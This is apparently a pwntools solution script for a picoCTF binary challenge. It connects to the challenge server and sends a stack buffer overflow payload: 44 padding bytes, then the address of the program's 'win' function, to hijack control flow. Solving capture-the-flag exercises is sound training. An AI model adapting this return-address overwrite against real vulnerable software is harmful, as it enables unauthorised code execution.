from pwn import *
from struct import *

exe = ELF("./vuln", checksec=False)
context.binary = exe
context.terminal = "konsole -e".split()

def gdbdebug(exe: process):
    script = """
    break vuln
    """
    gdb.attach(exe, gdbscript=script)

# p = process()
p = remote("saturn.picoctf.net", 53665)
#gdbdebug(p)
payload = b""
payload += b"A"*44
payload += pack("<I", exe.symbols["win"])
p.sendlineafter(b"Please enter your string:", payload)
p.interactive()